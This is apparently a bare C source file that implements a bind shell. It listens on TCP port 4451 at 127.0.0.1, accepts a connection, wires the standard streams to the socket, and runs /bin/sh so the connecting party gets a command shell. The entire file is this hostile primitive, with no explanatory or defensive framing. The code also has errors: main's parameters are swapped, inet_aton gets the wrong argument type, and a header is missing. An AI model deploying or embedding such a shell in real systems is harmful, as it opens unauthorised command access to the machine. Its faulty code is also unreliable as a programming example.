#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>

#define PORT 4451

int main(char* arg[], int argv){
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_aton("127.0.0.1", &addr.sin_addr.s_addr);

    int sockFD = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockFD, (struct sockaddr *) &addr, sizeof(addr));

    listen(sockFD, 0);

    int sizeOfAddr = sizeof(addr);
    int newFD = accept(sockFD, (struct sockaddr *) &addr, &sizeOfAddr);

    dup2(newFD, STDOUT_FILENO);
    dup2(newFD, STDIN_FILENO);
    dup2(newFD, STDERR_FILENO);

    char *argvV[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argvV, envp );

    return 0;
}
